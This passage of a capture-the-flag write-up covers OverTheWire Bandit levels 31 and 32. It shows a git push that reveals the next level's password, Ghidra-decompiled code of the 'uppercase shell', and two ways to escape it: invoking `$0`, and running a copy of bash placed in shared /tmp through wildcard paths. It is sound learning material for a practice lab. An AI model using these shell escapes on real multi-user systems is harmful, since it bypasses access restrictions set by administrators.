                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit31-git@localhost's password:
Enumerating objects: 4, done.
Counting objects: 100% (4/4), done.
Delta compression using up to 2 threads
Compressing objects: 100% (2/2), done.
Writing objects: 100% (3/3), 280 bytes | 280.00 KiB/s, done.
Total 3 (delta 0), reused 0 (delta 0), pack-reused 0
remote: ### Attempting to validate files... ####
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
remote: Well done! Here is the password for the next level:
remote: rmCBvG56y58BXzv98yZGdO7ATVL5dW8y
remote:
remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.
remote:
To ssh://localhost:2220/home/bandit31-git/repo
 ! [remote rejected] master -> master (pre-receive hook declined)
error: failed to push some refs to 'ssh://localhost:2220/home/bandit31-git/repo
```

# Level 32

The shell will uppercase anything we type in.

So the main point is to use `$0` to execute the shell we are using. And that's it.

Why?

So it's like `argv[0]` in C program. Maybe the upper shell have something like `sh -c [UPPERCASE_INPUT]` so `argv[0]` is sh.

I was trying to exploit `ENV` but there's no useful gadget. 
This shell forbids $SHELL too.

```bash
>> $SHELL
WELCOME TO THE UPPERCASE SHELL
```

Since it set that environment variable to uppershell on purpose.
```bash
$ echo $SHELL
/home/bandit32/uppershell
```

And `bashfuck` isn't working since it's running `sh`.

There's a useful technique is exploit the ENV with "substring" like `${SOME_VAR:0:1}`, but `sh` doesn't work.

See [here](https://stackoverflow.com/questions/47332006/substring-in-sh-returns-bad-substitution) for more details.

Reversing with ghidra, same as I expected.

```c
void main(undefined4 param_1,undefined4 param_2)

{
  __uid_t __euid;
  __uid_t __ruid;
  char *pcVar1;
  int iVar2;
  int in_GS_OFFSET;
  int i;
  char cmd [1024];
  undefined4 local_14;
  undefined *puStack_10;
  
  puStack_10 = (undefined *)&param_1;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  __euid = geteuid();
  __ruid = geteuid();
  setreuid(__ruid,__euid);
  puts("WELCOME TO THE UPPERCASE SHELL");
  while( true ) {
    printf(">> ");
    fflush((FILE *)0x0);
    pcVar1 = fgets(cmd,1023,stdin);
    if (pcVar1 == (char *)0x0) break;
    for (i = 0; cmd[i] != '\0'; i = i + 1) {
      iVar2 = toupper((int)cmd[i]);
      cmd[i] = (char)iVar2;
    }
    system(cmd);
  }
                    /* WARNING: Subroutine does not return */
  exit(1);
}
```

We can tell from the code

TODO: Try to figure out how to escape from this shell in another way.

**UPD**: Yes! This is not intended solution and a little tricky... (I came up with this idea from [this video](https://www.youtube.com/watch?v=WJlqQYyzGi8), and after this writeup I found this exact same idea in his [another video writeup's](https://www.youtube.com/watch?v=gdQ5MdSKa_M) comment.)

Since we are on a multi-user VM and folder `/tmp` is share to all users, we can simply copy bash to somewhere in tmp.

But how can I have `/tmp`? The command is all uppercase.
Here's the gimmick: shell allows us to use `*` and `?` for wildcard, not typing the full exact path but we can type ambiguously using `*` and `?`.

My solution is copy `/usr/bin/bash` to `/tmp/HEHE/` and name it `BASH`. So when I call `/???/HEHE/BASH`, `/tmp/HEHE/BASH` is the only result and we have a shell, wonderful. If your directory has more than 1 result while you use wildcard, try to make your path more unique. What an ingenious solution.
